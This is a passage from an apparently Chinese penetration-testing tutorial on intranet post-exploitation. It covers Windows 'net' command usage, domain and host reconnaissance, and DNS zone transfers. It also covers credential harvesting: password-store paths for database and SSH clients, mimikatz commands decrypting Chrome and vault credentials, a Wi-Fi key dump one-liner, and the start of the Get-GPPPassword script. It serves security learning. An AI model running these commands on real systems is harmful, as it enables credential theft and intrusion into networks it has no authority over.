file</code>获得服务器上打开文件的列表</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>id</code></td><td>文件标识号</td></tr><tr><td><code>/close</code></td><td>关闭打开的文件并释放锁定记录</td></tr></tbody></table><blockquote><p>GROUP</p></blockquote><p>作用：在 Windows NT/2000/2003 Server 域中添加、显示或更改全局组。</p><p>命令格式：<code>net group groupname &#123;/add [/comment:&quot;text &quot;] | /delete&#125; [/domain]</code></p><p>输入不带参数的命令<code>net group</code>显示服务器名称及服务器的组名称</p><p>举例：<code>net group test GHS1 GHS2 /add</code>将现有用户帐号GHS1和GHS2添加到本地计算机的test组。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>groupname</code></td><td>要添加、扩展或删除的组</td></tr><tr><td><code>/comment:&quot;text&quot;</code></td><td>为新建组或现有组添加注释</td></tr><tr><td><code>/domain</code></td><td>在当前域的主域控制器中执行该操作，否则在本地计算机上执行操作</td></tr><tr><td><code>username[...]</code></td><td>列表显示要添加到组或从组中删除的一个或多个用户</td></tr><tr><td><code>/add</code></td><td>添加组或在组中添加用户名</td></tr><tr><td><code>/delete</code></td><td>删除组或从组中删除用户名</td></tr></tbody></table><blockquote><p>LOCALGROUP</p></blockquote><p>作用：添加、显示或更改本地组。</p><p>命令格式：<code>net localgroup groupname &#123;/add [/comment:&quot;text &quot;] | /delete&#125; [/domain]</code></p><p>输入不带参数的命令<code>net localgroup</code>显示服务器名称和计算机的本地组名称</p><p>举例：</p><ul><li><code>net localgroup ggg /add</code> 将名为ggg的本地组添加到本地用户帐号数据库；　　</li><li><code>net localgroup ggg </code>显示ggg本地组中的用户。</li></ul><p>参数和解释都和上面一样这边就不写了</p><blockquote><p>PAUSE</p></blockquote><p>作用：暂停正在运行的服务。</p><p>命令格式：<code>net pause service</code></p><blockquote><p>SESSION</p></blockquote><p>作用：列出或断开本地计算机和与之连接的客户端的会话。</p><p>命令格式：<code>net session [\\computername] [/delete] [/list]</code></p><p>输入不带参数的命令<code>net session</code>显示所有与本地计算机的会话的信息。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>\\computername</code></td><td>标识要列出或断开会话的计算机。</td></tr><tr><td><code>/delete</code></td><td>结束与 <code>\\computername </code>计算机会话并关闭本次会话期间计算机的所有打开文件。如果省略<code>\\computername</code>参数，将取消与本地计算机的所有会话。</td></tr><tr><td><code>/list</code></td><td>列出清单</td></tr></tbody></table><blockquote><p>SHARE</p></blockquote><p>作用：创建、删除或显示共享资源。</p><p>命令格式：<code>net share sharename=drive:path [/users:number | /unlimited] [/remark:&quot;text&quot;]</code></p><p>输入不带参数的命令<code>net share</code>显示本地计算机上所有共享资源的信息</p><p>举例： </p><ul><li><code>net share ascotbe=c:\temp /remark:&quot;my first share&quot;</code>以ascotbe为共享名共享<strong>C:\temp</strong></li><li><code>net share ascotbe /delete</code>停止共享ascotbe目录</li></ul><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>sharename</code></td><td>是共享资源的网络名称</td></tr><tr><td><code>drive:path</code></td><td>指定共享目录的绝对路径</td></tr><tr><td><code>/users:number</code></td><td>设置可同时访问共享资源的最大用户数</td></tr><tr><td><code>/unlimited</code></td><td>不限制同时访问共享资源的用户数</td></tr><tr><td><code>/remark:&quot;text&quot;</code></td><td>添加关于资源的注释，注释文字用引号引住</td></tr></tbody></table><blockquote><p> START</p></blockquote><p>作用：启动服务，或显示已启动服务的列表。</p><p>命令格式：<code>net start service</code></p><blockquote><p>STATISTICS</p></blockquote><p>作用：显示本地工作站或服务器服务的统计记录。</p><p>命令格式：<code>net statistics workstation </code></p><blockquote><p> STOP</p></blockquote><p>作用：停止 Windows NT/2000/2003 网络服务。</p><p>命令格式：<code>net stop service</code></p><p>现在的系统都没有这个了，下面列出能停止的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">(1)alerter(警报)</span><br><span class="line">(2)client service for Netware(Netware 客户端服务)</span><br><span class="line">(3)clipbook server(剪贴簿服务器)</span><br><span class="line">(4)computer browser(计算机浏览器)</span><br><span class="line">(5)directory replicator(目录复制器)</span><br><span class="line">(6)ftp publishing service (ftp )(ftp 发行服务)</span><br><span class="line">(7)lpdsvc</span><br><span class="line">(8)Net logon(网络登录)</span><br><span class="line">(9)Network dde(网络 dde)</span><br><span class="line">(10)Network dde dsdm(网络 dde dsdm)</span><br><span class="line">(11)Network monitor agent(网络监控代理)</span><br><span class="line">(12)ole(对象链接与嵌入)</span><br><span class="line">(13)remote access connection manager(远程访问连接管理器)</span><br><span class="line">(14)remote access isnsap service(远程访问 isnsap 服务)</span><br><span class="line">(15)remote access server(远程访问服务器)</span><br><span class="line">(16)remote procedure call (rpc) locator(远程过程调用定位器)</span><br><span class="line">(17)remote procedure call (rpc) service(远程过程调用服务)</span><br><span class="line">(18)schedule(调度)</span><br><span class="line">(19)server(服务器)</span><br><span class="line">(20)simple tcp&#x2F;ip services(简单 TCP&#x2F;IP 服务)</span><br><span class="line">(21)snmp</span><br><span class="line">(22)spooler(后台打印程序)</span><br><span class="line">(23)tcp&#x2F;ip Netbios helper(TCP&#x2F;IP NETBIOS 辅助工具)</span><br><span class="line">(24)ups</span><br><span class="line">(25)workstation(工作站)</span><br><span class="line">(26)messenger(信使)</span><br><span class="line">(27)dhcp client</span><br></pre></td></tr></table></figure><blockquote><p>TIME</p></blockquote><p>作用：使计算机的时钟与另一台计算机或域的时间同步。</p><p>命令格式：<code>NET TIME [\\computername | /DOMAIN[:domainname] | /RTSDOMAIN[:domainname]] [/SET]</code></p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>\\computername</code></td><td>要检查或同步的服务器名</td></tr><tr><td><code>/domain[:domainname]</code></td><td>指定要与其时间同步的域</td></tr><tr><td><code>/set</code></td><td>使本计算机时钟与指定计算机或域的时钟同步。</td></tr><tr><td><code>/rtsdomain[:domainname]</code></td><td>RT域</td></tr></tbody></table><blockquote><p>VIEW</p></blockquote><p>作用：显示域列表、计算机列表或指定计算机的共享资源列表。</p><p>命令格式：<code>NET VIEW [\\computername [/CACHE] | [/ALL] | /DOMAIN[:domainname]]</code></p><p>举例：</p><ul><li><code>net view \\GHS</code>查看GHS计算机的共享资源列表。</li><li><code>net view /domain:ascotbe</code>查看ascotbe域中的机器列表。</li></ul><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>\\computername</code></td><td>指定要查看其共享资源的计算机</td></tr><tr><td><code>/CACHE</code></td><td>缓存中的</td></tr><tr><td><code>/ALL</code></td><td>所有的</td></tr><tr><td><code>/DOMAIN[:domainname</code></td><td>域中的</td></tr></tbody></table><blockquote><p>USER</p></blockquote><p>作用：添加或更改用户帐号或显示用户帐号信息。</p><p>命令格式：</p><ul><li><code>NET USER username [password | *] [options]] [/DOMAIN]</code></li><li><code>NET USER username &#123;password | *&#125; /ADD [options] [/DOMAIN]</code></li><li><code>NET USER username [/DELETE] [/DOMAIN]</code></li><li><code>NET USER username [/TIMES:&#123;times | ALL&#125;]</code></li><li><code>NET USER username [/ACTIVE: &#123;YES | NO&#125;]</code></li></ul><p>举例：<code>Net user ascotbe</code>查看用户ascotbe的信息。</p><p>输入不带参数的命令<code>Net user</code>查看计算机上的用户帐号列表</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>username</code></td><td>添加、删除、更改或查看用户帐号名</td></tr><tr><td><code>password</code></td><td>为用户帐号分配或更改密码</td></tr><tr><td><code>/domain</code></td><td>在计算机主域的主域控制器中执行操作</td></tr><tr><td><code>/DELETE</code></td><td>删除</td></tr><tr><td><code>/ADD</code></td><td>在域中增加账号</td></tr><tr><td><code>/ACTIVE</code></td><td>（这个没用过）</td></tr><tr><td><code>/TIMES</code></td><td>（没用过）</td></tr></tbody></table><blockquote><p>USE</p></blockquote><p>作用：连接计算机或断开计算机与共享资源的连接，或显示计算机的连接信息。</p><p>命令格式：</p><ul><li><code>NET USE [devicename | *] [\\computername\sharename[\volume] [password | *]]</code></li><li><code>NET USE [/USER:[domainname\]username]</code></li><li><code>NET USE [/USER:[dotted domain name\]username]</code></li><li><code>NET USE [/USER:[username@dotted domain name]</code></li><li><code>NET USE [/SMARTCARD]</code></li><li><code>NET USE [/SAVECRED]</code></li><li><code>NET USE [/REQUIREINTEGRITY]</code></li><li><code>NET USE [/REQUIREPRIVACY]</code></li><li><code>NET USE [/WRITETHROUGH]</code></li><li><code>NET USE [[/DELETE] | [/PERSISTENT:&#123;YES | NO&#125;]]</code></li></ul><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>devicename</code></td><td>指定要连接到的资源名称或要断开的设备名称</td></tr><tr><td><code>\\computername\sharename</code></td><td>服务器及共享资源的名称</td></tr><tr><td><code>password</code></td><td>访问共享资源的密码</td></tr><tr><td><code>*</code></td><td>提示键入密码</td></tr><tr><td><code>/user</code></td><td>连接的另外一个用户</td></tr><tr><td><code>domainname</code></td><td>指定另一个域</td></tr><tr><td><code>username</code></td><td>指定登录的用户名</td></tr><tr><td><code>/home</code></td><td>将用户连接到其宿主目录</td></tr><tr><td><code>/delete</code></td><td>取消指定网络连接</td></tr><tr><td><code>/persistent</code></td><td>控制永久网络连接的使用。</td></tr><tr><td><code>/SAVECRED</code></td><td>已保存</td></tr><tr><td><code>/REQUIREINTEGRITY</code></td><td>（不知道）</td></tr><tr><td><code>/REQUIREPRIVACY</code></td><td>（不知道）</td></tr><tr><td><code>/WRITETHROUGH</code></td><td>（不知道）</td></tr><tr><td><code>/SMARTCARD</code></td><td>智能卡</td></tr><tr><td><code>/volume</code></td><td>卷</td></tr></tbody></table><h4 id="查看域用户"><a href="#查看域用户" class="headerlink" title="查看域用户"></a>查看域用户</h4><p>普通域用户权限即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/35.png" alt="image-20200730231555944"></p><h4 id="查看域管理员"><a href="#查看域管理员" class="headerlink" title="查看域管理员"></a>查看域管理员</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/36.png" alt="image-20200730231613687"></p><h4 id="快速定位域控ip"><a href="#快速定位域控ip" class="headerlink" title="快速定位域控ip"></a>快速定位域控ip</h4><p>查到dimain后ping下这个主机名字，就能找到IP地址了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br><span class="line">ping WIN-1OUEMJB0766</span><br><span class="line">nslookup -<span class="built_in">type</span>=all _ldap._tcp.dc._msdcs.domain.com</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/37.png" alt="image-20200730231819436"></p><h4 id="查看域控制器"><a href="#查看域控制器" class="headerlink" title="查看域控制器"></a>查看域控制器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/38.png" alt="image-20200730231833721"></p><h3 id="内网主机发现"><a href="#内网主机发现" class="headerlink" title="内网主机发现"></a>内网主机发现</h3><h4 id="查看共享资料"><a href="#查看共享资料" class="headerlink" title="查看共享资料"></a>查看共享资料</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure><h4 id="查看arp表"><a href="#查看arp表" class="headerlink" title="查看arp表"></a>查看arp表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/39.png" alt="image-20200730231954183"></p><h4 id="查看hosts文件"><a href="#查看hosts文件" class="headerlink" title="查看hosts文件"></a>查看hosts文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#linux</span></span><br><span class="line">cat  /etc/hosts</span><br><span class="line"><span class="comment">#windows</span></span><br><span class="line"><span class="built_in">type</span>  c:\Windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/40.png" alt="image-20200730232021228"></p><h4 id="查看dns缓存"><a href="#查看dns缓存" class="headerlink" title="查看dns缓存"></a>查看dns缓存</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig  /displaydns</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/41.png" alt="image-20200730232057694"></p><h3 id="会话收集"><a href="#会话收集" class="headerlink" title="会话收集"></a>会话收集</h3><p>在网内收集会话，如看管理员登录过哪些机器、机器被谁登录过，这样攻击的目标就会清晰很多。</p><p>api相关介绍如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;lmshare&#x2F;nf-lmshare-netsessionenum</span><br></pre></td></tr></table></figure><h3 id="收集凭证"><a href="#收集凭证" class="headerlink" title="收集凭证"></a>收集凭证</h3><p>拿下一台机器后，需要尽可能的收集信息。如下是几个常用软件保存密码的注册表地址，可以根据算法去解密保存的账号密码。</p><table><thead><tr><th>数据库名称</th><th>注册表</th></tr></thead><tbody><tr><td>MySQL</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers&lt;your  connection name&gt;</td></tr><tr><td>MariaDB</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers&lt;your  connection name&gt;</td></tr><tr><td>MongoDB</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers&lt;your  connection name&gt;</td></tr><tr><td>Microsoft  SQL</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers&lt;your  connection name&gt;</td></tr><tr><td>Oracle</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers&lt;your  connection name&gt;</td></tr><tr><td>PostgreSQL</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers&lt;your  connection name&gt;</td></tr><tr><td>SQLite</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers&lt;your  connection name&gt;</td></tr></tbody></table><table><thead><tr><th>SecureCRT</th><th>注册表</th></tr></thead><tbody><tr><td>xp/win2003</td><td>C:\Documents  and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</td></tr><tr><td>win7/win2008以上</td><td>C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions</td></tr></tbody></table><table><thead><tr><th>Xshell</th><th>注册表</th></tr></thead><tbody><tr><td>Xshell 5</td><td>%userprofile%\Documents\NetSarang\Xshell\Sessions</td></tr><tr><td>Xshell 6</td><td>%userprofile%\Documents\NetSarang  Computer\6\Xshell\Sessions</td></tr></tbody></table><table><thead><tr><th>WinSCP</th><th>注册表</th></tr></thead><tbody><tr><td>WinSCP</td><td>HKCU\Software\Martin  Prikryl\WinSCP 2\Sessions</td></tr></tbody></table><table><thead><tr><th>VNC</th><th>注册表</th><th></th></tr></thead><tbody><tr><td>RealVNC</td><td>HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver</td><td>Password</td></tr><tr><td>TightVNC</td><td>HKEY_CURRENT_USER\Software\TightVNC\Server  Value</td><td>Password  or PasswordViewOnly</td></tr><tr><td>TigerVNC</td><td>HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4</td><td>Password</td></tr><tr><td>UltraVNC</td><td>C:\Program  Files\UltraVNC\ultravnc.ini</td><td>passwd or  passwd2</td></tr></tbody></table><h3 id="DPAP"><a href="#DPAP" class="headerlink" title="DPAP"></a>DPAP</h3><p>DPAPI，由微软从Windows 2000开始发布，称为Data ProtectionApplication Programming Interface（DPAPI）。其分别提供了加密函数CryptProtectData 与解密函数 CryptUnprotectData 。</p><h4 id="解密Chrome密码"><a href="#解密Chrome密码" class="headerlink" title="解密Chrome密码"></a>解密Chrome密码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz  dpapi::chrome /<span class="keyword">in</span>:<span class="string">&quot;%localappdata%\Google\Chrome\User Data\Default\Login  Data&quot;</span> /unprotect</span><br></pre></td></tr></table></figure><h4 id="解密Credential"><a href="#解密Credential" class="headerlink" title="解密Credential"></a>解密Credential</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz  vault::cred /patch</span><br></pre></td></tr></table></figure><h3 id="域信任"><a href="#域信任" class="headerlink" title="域信任"></a>域信任</h3><p>信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。</p><h4 id="查看域信任"><a href="#查看域信任" class="headerlink" title="查看域信任"></a>查看域信任</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest  /domain_trusts</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/42.png" alt="image-20200730232120794"></p><h3 id="域传送"><a href="#域传送" class="headerlink" title="域传送"></a>域传送</h3><p>当存在域传送漏洞时，可以获取域名解析记录。当有了解析记录后，也能提高对网络环境的进一步认知，比如www解析的ip段可能在dmz区，mail解析的ip段可能在核心区域等等。</p><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nslookup  -<span class="built_in">type</span>=ns domain.com</span><br><span class="line">nslookup</span><br><span class="line">sserver  dns.domain.com</span><br><span class="line">ls  domain.com</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/43.png" alt="image-20200730232427143"></p><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig  @dns.domain.com axfr domain.com</span><br></pre></td></tr></table></figure><h3 id="DNS记录获取"><a href="#DNS记录获取" class="headerlink" title="DNS记录获取"></a>DNS记录获取</h3><p>在网内收集dns记录，可以快速定位一些机器、网站。常用工具有Dnscmd、PowerView。</p><h4 id="Windows-Server"><a href="#Windows-Server" class="headerlink" title="Windows Server"></a>Windows Server</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dnscmd /ZonePrint ascotbe.com</span><br><span class="line">Dnscmd /EnumRecords ascotbe.com .</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/44.png" alt="image-20200730233830776"></p><h4 id="非Windows-Server"><a href="#非Windows-Server" class="headerlink" title="非Windows Server"></a>非Windows Server</h4><p>如果权限不足的话是没办法运行ps脚本的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本位置https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</span></span><br><span class="line">import-module  PowerView.ps1</span><br><span class="line">Get-DNSRecord  -ZoneName ascotbe.com</span><br></pre></td></tr></table></figure><h3 id="WIFI"><a href="#WIFI" class="headerlink" title="WIFI"></a>WIFI</h3><p>通过如下命令获取连接过的wifi密码，只能用CMD运行Powershell会报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f  <span class="string">&quot;skip=9 tokens=1,2 delims=:&quot;</span> %i <span class="keyword">in</span> (<span class="string">&#x27;netsh wlan show profiles&#x27;</span>)  <span class="keyword">do</span>  @<span class="built_in">echo</span> %j | findstr -i -v <span class="built_in">echo</span> |  netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/45.png" alt="image-20200730225857646"></p><h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><p>当分发组策略时，会在域的SYSVOL目录下生成一个gpp配置的xml文件，如果在配置组策略时填入了密码，则其中会存在加密过的账号密码。这些密码，往往都是管理员的密码。</p><p>其中xml中的密码是aes加密的，密钥已被微软公开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;openspecs&#x2F;windows_protocols&#x2F;ms-gppref&#x2F;2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom&#x3D;MSDN</span><br></pre></td></tr></table></figure><p>可以使用相关脚本进行解密，如</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Get-GPPPassword</span></span> &#123;</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.SYNOPSIS</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    PowerSploit Function: Get-GPPPassword</span></span><br><span class="line"><span class="comment">    Author: Chris Campbell (@obscuresec)</span></span><br><span class="line"><span class="comment">    License: BSD 3-Clause</span></span><br><span class="line"><span class="comment">    Required Dependencies: None</span></span><br><span class="line"><span class="comment">    Optional Dependencies: None</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"><span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Get-GPPPassword searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.PARAMETER Server</span></span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Specify the domain controller to search for. </span></span><br><span class="line"><span class="comment">    Default&#x27;s to the users current domain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    PS C:\&gt; Get-GPPPassword</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    NewName   : 